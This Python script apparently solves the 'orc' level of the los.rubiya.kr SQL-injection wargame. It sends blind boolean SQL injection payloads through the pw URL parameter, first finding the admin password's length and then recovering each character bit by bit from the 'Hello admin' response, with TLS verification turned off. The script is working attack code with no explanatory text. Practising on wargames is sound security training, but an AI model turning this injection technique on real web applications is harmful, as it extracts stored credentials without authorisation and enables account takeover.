import requests
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
cookie = {'PHPSESSID':'COOKIE'}
def get_len():
    pw_len = 1
    index = 1
    while True:
        url_encode = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=" + urllib.parse.quote(f"' or length(pw)={index} and id='admin'#")
        res = requests.get(url_encode, cookies=cookie, verify=False)
        if 'Hello admin' not in res.text:
            pw_len = pw_len + 1
        else:
            break
        index = index + 1
    return pw_len    

def get_password(pass_len):
    password = ''
    j = 1
    for i in range(1, pass_len+1):
        bit = ''
        bit_length = 1
        while True:
            url_encode = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=" + urllib.parse.quote(f"' or length(bin(ord(substr(pw,{j},1)))) = {bit_length} and id='admin")
            res = requests.get(url_encode, cookies=cookie, verify=False)
            bit_length += 1
            if 'Hello admin' in res.text:
                j += 1
                break
        for k in range(1, bit_length):
            url_encode = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=" + urllib.parse.quote(f"' or substr(bin(ord(substr(pw,{i},1))),{k},1)='1' and id='admin")
            #print(url_encode)
            res = requests.get(url_encode, cookies=cookie, verify=False)
            if 'Hello admin' in res.text:
                bit += '1'
            else:
                bit += '0'
        password += chr(int(bit,2))
    return password

pass_len = get_len()
print(pass_len)
print(get_password(pass_len))

